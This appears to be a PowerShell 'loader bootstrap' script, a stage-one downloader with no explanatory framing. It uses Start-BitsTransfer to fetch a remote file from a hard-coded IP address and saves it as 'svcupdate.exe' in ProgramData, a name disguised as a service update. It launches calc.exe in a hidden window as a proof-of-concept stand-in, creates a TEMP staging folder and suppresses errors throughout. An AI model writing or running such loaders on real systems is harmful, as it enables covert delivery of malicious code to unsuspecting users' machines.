
<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://192.0.2.166/stage1.ps1',
    [string]$OutputPath = "C:\ProgramData\svcupdate.exe",
    [int]$RequestTimeout = 236
)
Start-BitsTransfer -Source $TransferUrl -Destination $OutputPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Set-Location -Path $env:TEMP
